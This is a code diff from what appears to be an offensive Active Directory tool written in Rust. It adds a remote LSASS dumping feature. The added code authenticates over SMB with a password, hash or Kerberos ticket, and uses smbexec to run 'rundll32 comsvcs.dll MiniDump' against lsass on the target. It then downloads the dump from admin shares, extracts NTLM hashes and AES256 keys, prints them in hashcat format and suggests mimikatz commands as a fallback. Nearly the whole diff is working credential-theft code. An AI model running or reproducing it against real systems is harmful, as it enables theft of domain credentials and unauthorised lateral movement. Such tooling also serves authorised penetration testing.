@@ -568,7 +568,7 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource, user: Option<
             },
             format!("Dump LSA secrets from {}", target),
         ),
-        DumpSource::Ntds | DumpSource::Dcsync => {
+        DumpSource::Ntds => {
             let target_user = user.map(|s| s.to_string());
             let desc = if let Some(u) = user {
                 format!("DCSync user {} from {}", u, target)
@@ -592,6 +592,9 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource, user: Option<
             },
             format!("Dump DCC2 cached credentials from {}", target),
         ),
+        DumpSource::Lsass => {
+            return cmd_dump_lsass_remote(cli, target).await;
+        }
     };
 
     let step = overthrone_pilot::planner::PlanStep {
@@ -677,6 +680,255 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource, user: Option<
         }
         banner::print_fail(&format!("Dump failed: {}", result.output));
         1
+    }
+}
+
+// ----------------------------------------------
+// cmd_dump_lsass_remote -- Remote LSASS dump + download + parse pipeline
+// ----------------------------------------------
+
+async fn cmd_dump_lsass_remote(cli: &Cli, target: &str) -> i32 {
+    banner::print_module_banner("LSASS DUMP (REMOTE)");
+    println!(" {} Target: {}", ">".bright_black(), target.cyan());
+    println!(
+        " {} Pipeline: comsvcs.dll MiniDump -> SMB download -> minidump parse",
+        ">".bright_black()
+    );
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    println!(
+        " {} Authenticating as {}\\{}",
+        ">".bright_black(),
+        creds.domain.cyan(),
+        creds.username.cyan()
+    );
+
+    // Step 1: Connect via SMB
+    let smb_target = target;
+    let smb = match &creds.auth {
+        crate::auth::AuthData::Password(pass) => {
+            overthrone_core::proto::smb::SmbSession::connect(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                pass,
+            )
+            .await
+        }
+        crate::auth::AuthData::NtlmHash(hash) => {
+            overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                hash,
+            )
+            .await
+        }
+        crate::auth::AuthData::KerberosTicket(ticket_path) => {
+            let ticket = match overthrone_core::proto::smb::KerberosTicket::from_kirbi(ticket_path)
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to load Kerberos ticket: {}", e));
+                    return 1;
+                }
+            };
+            overthrone_core::proto::smb::SmbSession::connect_with_ticket(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                ticket,
+            )
+            .await
+        }
+    };
+
+    let smb = match smb {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&format!("SMB connect failed: {}", e));
+            return 1;
+        }
+    };
+
+    // Step 2: Execute comsvcs.dll MiniDump to create lsass.dmp
+    let dump_remote_path = "Users\\Administrator\\Documents\\lsass.dmp";
+    let dump_cmd = format!(
+        "RUNDLL32.EXE C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\{} full",
+        dump_remote_path
+    );
+
+    println!(
+        " {} Step 1/3: Executing LSASS dump on remote host...",
+        ">".bright_black()
+    );
+
+    use overthrone_core::exec::smbexec;
+    let exec_result = match smbexec::exec_command(&smb, &dump_cmd).await {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("SMBExec failed: {}", e));
+            return 1;
+        }
+    };
+
+    if exec_result.output.is_empty() {
+        println!(
+            " {} Note: No command output (expected for LSASS dump -- output goes to file)",
+            "!".bright_black()
+        );
+    } else {
+        println!("{}", exec_result.output);
+    }
+
+    // Step 3: Download the dump file
+    println!(
+        " {} Step 2/3: Downloading lsass.dmp via SMB...",
+        ">".bright_black()
+    );
+
+    let remote_parts: Vec<&str> = dump_remote_path.split('\\').collect();
+    let remote_path_normalized = remote_parts.join("/");
+    // Try multiple possible paths
+    let possible_paths = [
+        format!("C$/{}", remote_path_normalized),
+        "ADMIN$/Users/Administrator/Documents/lsass.dmp".to_string(),
+        "C$/Windows/Temp/lsass.dmp".to_string(),
+    ];
+
+    let mut dump_data = None;
+    for path in &possible_paths {
+        let parts: Vec<&str> = path.splitn(2, '/').collect();
+        if parts.len() == 2 {
+            match smb.read_file(parts[0], parts[1]).await {
+                Ok(data) if !data.is_empty() => {
+                    println!(
+                        " {} Downloaded {} bytes from {}",
+                        "[+]".green(),
+                        data.len().to_string().cyan(),
+                        path.yellow()
+                    );
+                    dump_data = Some(data);
+                    break;
+                }
+                Ok(_) => {
+                    println!(
+                        " {} Path {} returned empty data, trying next...",
+                        "!".bright_black(),
+                        path.yellow()
+                    );
+                }
+                Err(e) => {
+                    println!(
+                        " {} Path {} failed: {}, trying next...",
+                        "!".bright_black(),
+                        path.yellow(),
+                        e
+                    );
+                }
+            }
+        }
+    }
+
+    let dump_data = match dump_data {
+        Some(d) => d,
+        None => {
+            banner::print_fail(
+                "Could not download lsass.dmp from any expected path. \
+                 The sandbox may have blocked file creation. Try running \
+                 `ovt exec --method winrm` instead of smbexec.",
+            );
+            return 1;
+        }
+    };
+
+    // Step 4: Parse the minidump locally (cross-platform)
+    println!(
+        " {} Step 3/3: Parsing minidump for credentials...",
+        ">".bright_black()
+    );
+
+    match overthrone_core::postex::minidump_parser::parse_minidump(&dump_data) {
+        Ok(result) => {
+            if result.credentials.is_empty() {
+                println!(
+                    " {} No credentials found in minidump. The dump may be incomplete or encrypted.",
+                    "!".bright_black()
+                );
+                println!(
+                    " {} Tip: Transfer the .dmp file to Windows and use mimikatz: \
+                     sekurlsa::minidump lsass.dmp && sekurlsa::logonPasswords",
+                    "!".bright_black()
+                );
+            } else {
+                println!();
+                println!(
+                    " {} Found {} credential(s):",
+                    "[+]".green(),
+                    result.credentials.len().to_string().cyan()
+                );
+                println!();
+
+                // Print header
+                println!(
+                    " {:<30} {:<15} {:<40} {:<40}",
+                    "Username".cyan(),
+                    "LogonType".bright_black(),
+                    "NTLM Hash".yellow(),
+                    "AES256 Key".bright_black()
+                );
+                println!(" {}", "-".repeat(125).bright_black());
+
+                for cred in &result.credentials {
+                    let ntlm = cred.ntlm.as_deref().unwrap_or("--").to_string();
+                    let aes = cred.aes256.as_deref().unwrap_or("--").to_string();
+                    let logon_type = cred.session_type.as_deref().unwrap_or("--");
+                    println!(
+                        " {:<30} {:<15} {:<40} {:<40}",
+                        cred.identity.cyan(),
+                        logon_type.bright_black(),
+                        ntlm.yellow(),
+                        aes.bright_black()
+                    );
+                }
+
+                println!();
+                banner::print_success(&format!(
+                    "LSASS dump parsed -- {} credential(s) extracted",
+                    result.credentials.len()
+                ));
+
+                // Offer hashcat format
+                for cred in &result.credentials {
+                    if let Some(ref nt) = cred.ntlm {
+                        let lm = "aad3b435b51404eeaad3b435b51404ee";
+                        println!(" {} Hashcat: {}:{}:{}", "[*]".cyan(), cred.identity, lm, nt);
+                    }
+                }
+            }
+
+            if !result.warnings.is_empty() {
+                for w in &result.warnings {
+                    println!(" {} {}", "!".bright_black(), w.bright_black());
+                }
+            }
+
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Minidump parse failed: {}", e));
+            println!(
+                " {} Tip: Save the .dmp file and use on Windows with mimikatz:",
+                "!".bright_black()
+            );
+            println!("   mimikatz # sekurlsa::minidump lsass.dmp",);
+            println!("   mimikatz # sekurlsa::logonPasswords",);
+            1
+        }
     }
 }
 
